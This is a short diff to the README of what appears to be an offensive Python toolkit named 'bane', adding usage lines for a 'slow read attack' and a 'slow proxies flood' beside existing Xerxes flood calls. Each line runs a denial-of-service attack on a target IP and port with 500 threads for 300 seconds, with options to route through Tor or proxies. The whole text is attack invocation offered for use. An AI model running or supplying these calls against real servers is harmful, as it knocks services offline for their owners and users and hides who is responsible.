@@ -131,3 +131,7 @@ II-Usage:
 <br>bane.xerxes(IP, p= port , duration= 300 ,set_tor=False , threads=500 , timeout=5 )
 <h4>Xerxes attack through proxies:</h4>
 <br>bane.prox_xerxes(IP, p= port , duration= 300 , threads=500 , timeout=5 )
+<h4>slow read attack:</h4>
+<br>bane.slow_read(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
+<h4>slow proxies flood:</h4>
+<br>bane.prox_slow(IP, p= port , duration= 300 , set_tor=False , threads=500 , timeout=5 )
